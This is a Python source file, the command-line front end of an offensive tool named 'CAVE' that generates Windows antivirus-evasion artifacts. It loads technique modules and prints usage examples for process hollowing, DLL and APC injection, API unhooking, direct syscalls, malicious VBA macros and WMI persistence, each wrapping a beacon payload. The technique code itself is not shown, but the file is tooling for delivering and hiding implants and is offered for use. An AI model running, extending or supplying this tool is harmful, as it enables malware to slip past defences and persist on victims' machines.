import os
import sys
import importlib
import click
from colorama import init, Fore, Style

# Initialize Colorama
init(autoreset=True)

# Add project root to sys.path to allow for absolute imports
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from core import EvasionTechnique

# Dictionary to store specific command examples for techniques
# These provide more illustrative examples than purely auto-generated ones.
# Windows paths use escaped backslashes for Python string literals.
TECHNIQUE_EXAMPLES = {
    "process-hollowing": "--payload payloads/beacon.bin --output ph_out.exe --process C:\\Windows\\System32\\notepad.exe",
    "dll-injection": "--payload payloads/beacon.bin --output-dll injected_payload.dll --output-exe dll_loader.exe --process-name notepad.exe",
    "apc-injection": "--payload payloads/beacon.bin --output apc_injector.exe --process C:\\Windows\\System32\\runtimebroker.exe",
    "api-unhooking": "--payload payloads/beacon.bin --output unhooked_runner.exe",
    "direct-syscalls": "--payload payloads/beacon.bin --output syscall_runner.exe",
    "vba-macro": "--payload payloads/beacon.bin --output office_macro.vba",
    "wmi-persistence": "--action setup --payload payloads/beacon.bin --output setup_wmi.vbs --filter-name MyWMIFilter --consumer-name MyWMIConsumer --payload-script-name dropped_payload.vbs --payload-drop-dir C:\\Users\\Public\\Libraries"
}

def load_techniques():
    """Dynamically loads all technique classes from the 'core' directory."""
    techniques = {}
    core_dir = os.path.join(os.path.dirname(__file__), "core")
    if not os.path.isdir(core_dir):
        print(Fore.RED + f"Error: Core directory '{core_dir}' not found. Cannot load techniques.")
        return techniques
        
    for filename in os.listdir(core_dir):
        if filename.endswith('.py') and filename != '__init__.py':
            module_name = f"core.{filename[:-3]}"
            try:
                module = importlib.import_module(module_name)
                for item_name in dir(module):
                    item = getattr(module, item_name)
                    if isinstance(item, type) and issubclass(item, EvasionTechnique) and item is not EvasionTechnique:
                        instance = item()
                        techniques[instance.name] = instance
            except ImportError as e:
                print(Fore.RED + f"Error loading technique from {filename}: {e}")
            except Exception as e: # Catch other potential errors during class instantiation
                print(Fore.RED + f"Unexpected error initializing technique from {filename}: {type(e).__name__} - {e}")
    return techniques

@click.group(context_settings=dict(help_option_names=['-h', '--help']))
def cli():
    """
    CAVE: A modular CLI for generating Windows AV evasion artifacts.
    """
    print(Fore.CYAN + Style.BRIGHT + "--- CAVE AV Evasion Tool ---")

# Define epilog for the main help message
cli.help_epilog = """\b
Examples:
  List all available evasion techniques:
    python3 main.py list
\b
  Show help for a specific technique (e.g., process-hollowing):
    python3 main.py process-hollowing --help
\b
  Generate an artifact using the process-hollowing technique:
    python3 main.py process-hollowing --payload payloads/beacon.bin --output ph_artifact.exe
\b
  Generate a VBA macro for Office documents:
    python3 main.py vba-macro --payload payloads/beacon.bin --output macro_payload.vba
\b
  Setup WMI persistence (interactive logon trigger):
    python3 main.py wmi-persistence --action setup --payload payloads/beacon.bin --output wmi_setup.vbs
"""

@cli.command()
def list():
    """Lists all available evasion techniques."""
    print(Fore.YELLOW + "Available Techniques:")
    techniques = load_techniques()
    if not techniques:
        print(Fore.RED + "No techniques found. Check the 'core' directory or module loading issues.")
        return
    for name, tech in techniques.items():
        print(f"  - {Fore.GREEN}{name}{Style.RESET_ALL}: {tech.description}")
    print("\nUse 'python3 main.py <technique-name> --help' for more details on a specific technique.")


def create_command_for_technique(technique):
    """Factory function to create a Click command for a given technique."""
    
    # Prepare epilog with example for the technique command
    example_args_str = TECHNIQUE_EXAMPLES.get(technique.name)
    epilog_text = None
    if example_args_str:
        epilog_text = f"Example:\n  python3 main.py {technique.name} {example_args_str}"
    else:
        # Generate a generic placeholder example if no specific one is defined
        generic_example_parts = [f"python3 main.py {technique.name}"]
        has_required_options = False
        for opt_def in technique.options:
            if opt_def.get('required'):
                has_required_options = True
                placeholder_name = opt_def['name'][2:].replace('-', '_') # e.g. --payload-path -> payload_path
                placeholder_val = f"<{placeholder_name}_value>"
                generic_example_parts.append(f"{opt_def['name']} {placeholder_val}")
        
        if has_required_options: # Only show generic example if there are required options
            epilog_text = f"Example (generic - replace placeholders):\n  {' '.join(generic_example_parts)}"

    @click.command(name=technique.name, help=technique.description, epilog=epilog_text)
    def command_func(**kwargs):
        """ The actual command function that gets executed. """
        try:
            technique.generate(**kwargs)
        except FileNotFoundError as e:
            print(Fore.RED + f"[ERROR] File not found: {e}. Please check your path.")
        except Exception as e:
            print(Fore.RED + f"[ERROR] An unexpected error occurred during '{technique.name}' generation: {type(e).__name__} - {e}")
            # For more detailed debugging, you might want to print the traceback
            # import traceback
            # print(Fore.RED + traceback.format_exc())

    # Dynamically add options from the technique's definition
    processed_command_func = command_func 
    for option_config in reversed(technique.options):
        click_type_map = {
            'str': str,
            'int': int,
            'bool': bool
        }
        
        # Get the type specifier from option_config (e.g., 'str', str, 'INT', int)
        option_type_specifier = option_config.get('type', str) # Default to Python type `str`
        
        type_key_for_map = 'str' # Default key if specifier is unusual
        if isinstance(option_type_specifier, str): 
            type_key_for_map = option_type_specifier.lower()
        elif isinstance(option_type_specifier, type): 
            type_key_for_map = option_type_specifier.__name__.lower()
        
        actual_click_type = click_type_map.get(type_key_for_map, str)

        is_flag_setting = False
        if actual_click_type is bool:
            is_flag_setting = True

        processed_command_func = click.option(
            option_config['name'],
            type=actual_click_type,
            required=option_config.get('required', False),
            default=option_config.get('default'), 
            help=option_config.get('help', ''),
            show_default=True, 
            is_flag=is_flag_setting
        )(processed_command_func)
    
    return processed_command_func

# Dynamically add all loaded techniques as commands to the CLI
techniques_loaded = load_techniques()
if techniques_loaded:
    for tech_name, tech_instance in techniques_loaded.items():
        cli.add_command(create_command_for_technique(tech_instance))
else:
    print(Fore.YELLOW + "No techniques were loaded. CLI will have limited functionality.")

if __name__ == '__main__':
    cli()